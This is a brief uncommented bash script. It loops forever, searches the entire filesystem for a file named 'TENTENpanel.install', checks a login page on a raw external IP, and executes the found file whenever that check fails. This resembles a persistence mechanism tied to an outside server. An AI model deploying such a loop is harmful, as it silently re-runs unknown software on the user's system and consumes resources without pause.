#!/bin/bash
while :
	do
		dir1="$(find / -name "TENTENpanel.install")"
		dir2="$(find / -name "TENTENpanel.install")"
		curl -fsSL http://163.44.206.228/cPanel/login.php >/dev/null 2>&1 || ./$dir1 || ./$dir2
done